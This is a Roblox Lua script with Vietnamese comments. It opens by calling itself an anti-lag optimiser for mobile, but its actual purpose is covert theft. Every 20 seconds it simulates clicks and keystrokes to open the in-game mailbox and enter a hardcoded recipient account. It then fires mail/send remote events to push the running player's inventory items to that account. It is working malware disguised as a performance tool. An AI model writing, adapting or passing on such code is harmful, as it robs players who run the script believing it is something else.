-- Hệ thống chống đơ máy tối ưu cho Mobile
if not game:IsLoaded() then
    pcall(function() game.Loaded:Wait() end)
end

print("==== SPEED HUB V2: GIẢ LẬP GÕ PHÍM ẢO NHẬP TÊN - CHỐNG CHẶN TEXT ====")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ
local VirtualInputManager = game:GetService("VirtualInputManager")

-- =======================================================================
-- HÀM GIẢ LẬP CLICK VÀO TỌA ĐỘ MÀN HÌNH
-- =======================================================================
local function autoClickAt(x, y)
    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 1)
    task.wait(0.1)
    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 1)
    task.wait(0.5)
end

-- =======================================================================
-- HÀM GIẢ LẬP GÕ PHÍM ẢO (BẤM TỪNG CHỮ NHƯ NGƯỜI THẬT)
-- =======================================================================
local function virtualType(text)
    for i = 1, #text do
        local char = string.sub(text, i, i)
        -- Chuyển ký tự thành mã phím tương ứng (mặc định lấy Enum chuẩn)
        local keyCode = Enum.KeyCode[string.upper(char)]
        if keyCode then
            VirtualInputManager:SendKeyEvent(true, keyCode, false, game)
            task.wait(0.05)
            VirtualInputManager:SendKeyEvent(false, keyCode, false, game)
            task.wait(0.05)
        end
    end
    task.wait(0.2)
    -- Ấn Enter để xác nhận hoàn tất nhập dữ liệu
    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
    task.wait(0.05)
    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
    task.wait(0.5)
end

-- =======================================================================
-- LUỒNG CHẠY TỰ ĐỘNG - CỨ 20 GIÂY MỘT VÒNG
-- =======================================================================
task.spawn(function()
    task.wait(5) -- Chờ 5 giây đầu game ổn định
    
    while true do
        print("[SPEED HUB V2] Đang giả lập bấm mở bảng Mail...")
        
        local camera = workspace.CurrentCamera
        local screenSize = camera.ViewportSize
        local screenX = screenSize.X
        local screenY = screenSize.Y
        
        -- 1. Click mở nút Mail ở góc trên cùng bên phải màn hình
        local mailButtonX = screenX * 0.92  
        local mailButtonY = screenY * 0.08  
        autoClickAt(mailButtonX, mailButtonY)
        task.wait(2) -- Chờ bảng Mailbox hiện ra ổn định
        
        -- 2. Xác định tọa độ Ô TÌM KIẾM (Search Box) trong bảng Mail
        -- Thông thường ô này nằm ở nửa trên của bảng giao diện. Ta tính toán tỷ lệ chính giữa bảng:
        local searchBoxX = screenX * 0.50 -- Giữa màn hình theo chiều ngang
        local searchBoxY = screenY * 0.38 -- Khoảng 38% chiều dọc (Vị trí thanh tìm kiếm trong bảng)
        
        -- Click vào ô tìm kiếm để kích hoạt con trỏ chuột nhập chữ
        autoClickAt(searchBoxX, searchBoxY)
        task.wait(0.8)
        
        print("[SPEED HUB V2] Đang kích hoạt gõ phím ảo tên nick chính...")
        -- Kích hoạt gõ chữ ngầm "sutkucheonhamku" bằng bàn phím ảo
        virtualType(targetUsername)
        task.wait(1.5) -- Chờ danh sách lọc kết quả tên người chơi
        
        -- 3. Click chọn nick trong danh sách hòm thư (vùng hiển thị kết quả)
        local targetCardX = screenX * 0.50 -- Click thẳng vào giữa danh sách hiển thị kết quả
        local targetCardY = screenY * 0.55 
        autoClickAt(targetCardX, targetCardY)
        task.wait(1.5)
        
        -- 4. Bắn lệnh dọn kho và gửi đồ lên Server
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
        
        if Inventory then
            for _, item in pairs(Inventory:GetDescendants()) do
                if item:IsA("ValueBase") and item.Value and type(item.Value) == "number" and item.Value > 0 then
                    local lowerName = string.lower(item.Name)
                    if not string.find(lowerName, "cash") and not string.find(lowerName, "level") then
                        
                        -- Quét nhanh remote ép chuyển đồ đi
                        for _, remote in pairs(game:GetDescendants()) do
                            if remote:IsA("RemoteEvent") and (string.find(string.lower(remote.Name), "mail") or string.find(string.lower(remote.Name), "send")) then
                                pcall(function() 
                                    remote:FireServer(targetUsername, item.Name, math.min(item.Value, 20)) 
                                end)
                            end
                        end
                        task.wait(0.3)
                    end
                end
            end
        end
        task.wait(1)
        
        -- 5. Click vào nút "X" màu đỏ để đóng bảng lại, chuẩn bị cho chu kỳ sau
        local closeX = screenX * 0.73 
        local closeY = screenY * 0.25
        autoClickAt(closeX, closeY)
        print("[SPEED HUB V2] Đã hoàn tất gửi đồ và đóng bảng!")
        
        -- Chờ đúng 20 giây lặp lại toàn bộ quá trình
        task.wait(20)
    end
end)
